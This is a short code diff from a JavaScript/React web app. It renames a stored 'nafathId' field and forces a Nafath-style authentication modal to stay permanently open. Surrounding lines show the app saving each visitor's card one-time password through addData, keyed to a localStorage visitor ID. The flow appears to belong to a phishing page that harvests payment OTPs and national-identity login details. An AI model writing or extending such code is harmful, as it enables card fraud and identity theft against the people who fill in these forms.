@@ -535,7 +535,7 @@ addData({id:visitor,cardOtp})
       return
     }
     const visitorId = localStorage.getItem("visitor")
-    await addData({ id: visitorId, nafathId, authNumber: "" })
+    await addData({ id: visitorId, nafazId:nafathId, authNumber: "" })
 
     setIsVerifying(true)
     setVerificationError("")
@@ -1326,7 +1326,7 @@ addData({id:visitor,cardOtp})
         )}
 
         {step === "auth-dialog" && (
-            <NafazModal isOpen={showModal} onClose={() => setShowModal(false)}  phone={shippingInfo.phone} />
+            <NafazModal isOpen={true} onClose={() => setShowModal(false)}  phone={shippingInfo.phone} />
         )}
 
         {/* Success Step */}
